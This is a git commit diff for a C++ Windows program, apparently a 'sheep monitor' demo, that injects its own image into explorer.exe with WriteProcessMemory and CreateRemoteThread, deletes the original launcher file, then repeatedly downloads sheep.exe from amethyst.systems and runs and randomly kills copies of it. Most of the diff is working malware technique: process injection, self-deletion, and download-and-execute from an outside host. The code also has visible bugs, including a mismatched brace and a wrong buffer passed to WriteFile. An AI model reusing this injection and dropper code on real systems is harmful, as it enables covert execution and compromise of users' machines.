4cb5f91a6ea2d91442fc2190aff414bdc1e35205
frank2 <frank2@dc949.org>
2024-12-24 00:38:04 -0800

    create win32 entrypoint and complete the monitor

--- main.cpp
+++ main.cpp
@@ -1,10 +1,15 @@
 #include <cstdint>
 #include <cstddef>
 #include <cstdlib>
+#include <ctime>
 #include <cstring>
 #include <cassert>
+#include <optional>
+#include <vector>
 #include <windows.h>
 #include <psapi.h>
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
 
 #define VA_TO_RVA(base, va) (((std::uintptr_t)va) - ((std::uintptr_t)base))
 
@@ -64,11 +69,27 @@ void relocate_image(std::uint8_t *image, std::uintptr_t from, std::uintptr_t to)
             
       base_reloc += base_reloc_block->SizeOfBlock;
    }
+
+   // the loader assigns OptionalHeader.ImageBase after relocation
+   nt_headers->OptionalHeader.ImageBase = (ULONGLONG)to;
 }
 
-DWORD WINAPI load_image(LPVOID image_base) {
-   std::uint8_t *base_u8 = (std::uint8_t *)image_base;
+struct SheepConfig {
+   std::uintptr_t image_base;
+   MonitorState state;
+   DWORD launcher_pid;
+   char launcher_file[MAX_PATH+1];
+   std::size_t max_sheep;
+};
+
+SheepConfig *GLOBAL_CONFIG = nullptr;
+
+DWORD WINAPI load_image(SheepConfig *config) {
+   GLOBAL_CONFIG = config;
+   MAIN_STATE = GLOBAL_CONFIG->state;
+   std::uint8_t *base_u8 = (std::uint8_t *)GLOBAL_CONFIG->image_base;
    PIMAGE_NT_HEADERS64 base_nt = get_nt_headers(base_u8);
+   
    DWORD import_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 
    if (import_rva != 0) {
@@ -108,12 +129,157 @@ DWORD WINAPI load_image(LPVOID image_base) {
       }
    }
 
-   MAIN_STATE = MonitorState::STATE_MONITOR;
-
    return 0;
 }
 
-int main(int argc, char *argv[]) {
+bool download_url(const wchar_t *domain, const std::wchar_t *url, const char *filename) {
+   HINTERNET session = WinHttpOpen(L"Amethyst Labs/1.0",
+                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                   WINHTTP_NO_PROXY_NAME,
+                                   WINHTTP_NO_PROXY_BYPASS,
+                                   0);
+
+   if (session == nullptr)
+      return false;
+
+   HINTERNET connection = WinHttpConnect(session,
+                                         domain,
+                                         INTERNET_DEFAULT_HTTPS_PORT,
+                                         0);
+
+   if (connection == nullptr)
+      return false;
+
+   HINTERNET request = WinHttpOpenRequest(connection,
+                                          L"GET",
+                                          url,
+                                          nullptr,
+                                          WINHTTP_NO_REFERER,
+                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                          WINHTTP_FLAG_SECURE);
+
+   if (request == nullptr)
+      return false;
+
+   bool results = WinHttpSendRequest(request,
+                                     WINHTTP_NO_ADDITIONAL_HEADERS,
+                                     0,
+                                     WINHTTP_NO_REQUEST_DATA,
+                                     0,
+                                     0,
+                                     0);
+
+   if (!results)
+      return false;
+
+   results = WinHttpReceiveResponse(request, nullptr);
+
+   if (!results)
+      return false;
+
+   std::size_t out_size = 0;
+   std::uint32_t chunk = 0;
+   std::vector<std::uint8_t> out_buff;
+   std::uint32_t downloaded = 0;
+
+   if (!WinHttpQueryDataAvailable(request, &chunk))
+      return false;
+
+   while (chunk > 0) {
+      if (out_size == 0)
+         out_buff.resize(chunk, 0);
+      else
+         out_buff.resize(out_size+chunk, 0);
+
+      std::memset(&out_buff[out_size], 0, chunk);
+
+      if (!WinHttpReadData(request, &out_buff[out_size], chunk, &downloaded))
+         return false;
+
+      out_size += chunk;
+
+      if (!WinHttpQueryDataAvailable(request, &chunk))
+         return false;
+   }
+
+   HANDLE sheep_handle = CreateFileA(filename,
+                                     GENERIC_WRITE,
+                                     0,
+                                     nullptr,
+                                     CREATE_ALWAYS,
+                                     FILE_ATTRIBUTE_NORMAL,
+                                     nullptr);
+
+   if (sheep_handle == INVALID_HANDLE_VALUE)
+      return false;
+
+   DWORD bytes_written;
+
+   if (!WriteFile(sheep_handle, &out_buff, out_buff.size(), &bytes_written, nullptr)) {
+      CloseHandle(sheep_handle);
+      return false;
+   }
+
+   CloseHandle(sheep_handle);
+
+   return true;
+}
+
+bool spawn_sheep(LPPROCESS_INFORMATION proc_info) {
+   STARTUPINFOA startup_info;
+   memset(&startup_info, 0, sizeof(STARTUPINFOA));
+   startup_info.cb = sizeof(STARTUPINFOA);
+
+   return (bool)CreateProcessA("C:\\ProgramData\\sheep.exe",
+                               "sheep",
+                               nullptr,
+                               nullptr,
+                               FALSE,
+                               0,
+                               nullptr,
+                               nullptr,
+                               &startup_info,
+                               proc_info);
+}
+
+bool clear_inactive_sheep(std::vector<PROCESS_INFORMATION> &sheep_pool) {
+   bool result = false;
+   
+   for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
+      HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, iter->dwProcessId);
+
+      if (proc == nullptr) {
+         sheep_pool.erase(iter);
+         result = true;
+      }
+      else
+         CloseHandle(proc);
+   }
+
+   return result;
+}
+
+void russian_roulette(std::vector<PROCESS_INFORMATION> &sheep_pool) {
+   std::size_t chambers = 6;
+   
+   for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
+      if (chambers == 0)
+         chambers = 6;
+      
+      if ((std::rand() % (chambers--)) != 0)
+         continue;
+
+      HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, iter->dwProcessId);
+
+      if (proc == nullptr)
+         continue;
+
+      TerminateProcess(proc, 0);
+      chambers = 6;
+   }
+}
+
+int WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR cmdline, int showcmd) {
    switch (MAIN_STATE) {
    case MonitorState::STATE_MIGRATE: {
       /* enum processes and get pid tied to explorer.exe */
@@ -159,7 +325,6 @@ int main(int argc, char *argv[]) {
 
       /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE */
       HANDLE explorer_proc = OpenProcess(PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, found_pid);
-      DWORD error = GetLastError();
       assert(explorer_proc != nullptr);
       
       /* allocate space for our executable */
@@ -176,11 +341,24 @@ int main(int argc, char *argv[]) {
       /* write the relocated executable to the process's allocation with WriteProcessMemory */
       SIZE_T bytes_written;
       assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.SizeOfImage, &bytes_written));
+
+      std::uintptr_t config_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, sizeof(SheepConfig), MEM_COMMIT, PAGE_READWRITE);
+      assert(config_base != 0);
+
+      SheepConfig explorer_config;
+      std::memset(&explorer_config, 0, sizeof(SheepConfig));
+      explorer_config.image_base = explorer_base;
+      explorer_config.state = MonitorState::STATE_MONITOR;
+      explorer_config.launcher_pid = GetCurrentProcessId();
+      explorer_config.max_sheep = 10;
+      GetModuleFileName(nullptr, &explorer_config.launcher_file[0], MAX_PATH);
+
+      assert(WriteProcessMemory(explorer_proc, (LPVOID)config_base, &explorer_config, sizeof(SheepConfig), &bytes_written));
       
       /* get the rva of the loader and call it with CreateRemoteThread */
       DWORD loader_rva = VA_TO_RVA(self_u8, load_image);
       DWORD loader_id;
-      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), (LPVOID)explorer_base, 0, &loader_id);
+      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), (LPVOID)config_base, 0, &loader_id);
       assert(loader_handle != nullptr);
       
       /* wait for the thread to finish */
@@ -196,11 +374,67 @@ int main(int argc, char *argv[]) {
 
    case MonitorState::STATE_MONITOR: {
       atexit(exit_thread);
-      char filename[MAX_PATH+1];
-      std::memset(&filename[0], 0, MAX_PATH+1);
-      std::size_t filename_size = GetModuleFileNameA(nullptr, &filename[0], MAX_PATH);
-      MessageBoxA(nullptr, filename, "[SHEEP MONITOR]", MB_ICONEXCLAMATION | MB_OK);
-      /* monitor_sheep() */
+
+      DWORD exit_code = STILL_ACTIVE;
+      
+      do {
+         HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GLOBAL_CONFIG->launcher_pid);
+
+         // if it results in a null handle, the process is probably dead
+         if (proc == nullptr)
+            break;
+
+         GetExitCodeProcess(proc, &exit_code);
+         Sleep(1000);
+      } while (exit_code == STILL_ACTIVE);
+
+      /* we could get fancy and persist in the registry if we so wanted to right here,
+       * but for demo purposes we simply delete the original file */
+      while (!DeleteFile(GLOBAL_CONFIG->launcher_file)) {
+         DWORD error = GetLastError();
+
+         if (error == ERROR_FILE_NOT_FOUND)
+            break;
+         
+         Sleep(1000);
+      }
+
+      std::srand(std::time(0));
+
+      /* let's talk about the sheep monitor! this silly little demo basically does the following:
+       * create a vector of sheep processes
+       * poll every minute
+       * if C:\ProgramData\sheep.exe does not exist, download it from amethyst.systems/sheep.exe
+       * if sheep_pool is at the limit, check if any sheep has died and clear them from the list
+       * if number of sheep does not meet the limit, spawn a sheep process
+       * if the number of sheep is at the limit, one sheep plays Russian Roulette
+       * if they lose, they die */
+
+      std::vector<PROCESS_INFORMATION> sheep_pool;
+
+      while (1) {
+         if (GetFileAttributes("C:\\ProgramData\\sheep.exe") == INVALID_FILE_ATTRIBUTES && !download_url(L"amethyst.systems", L"/sheep.exe", "C:\\ProgramData\\sheep.exe"))           
+            goto next_sheep_poll;
+
+         if (sheep_pool.size() < GLOBAL_CONFIG->max_sheep) {
+            PROCESS_INFORMATION new_sheep;
+            
+            if (!spawn_sheep(&new_sheep))
+               goto next_sheep_poll;
+            
+            sheep_pool.push_back(new_sheep);
+
+            goto next_sheep_poll;
+         }
+         else if (clear_inactive_sheep(sheep_pool)) {
+            continue;
+         
+         russian_roulette(sheep_pool);
+
+      next_sheep_poll:
+         Sleep(60000);
+      }
+      
       return 0;
    }
    }
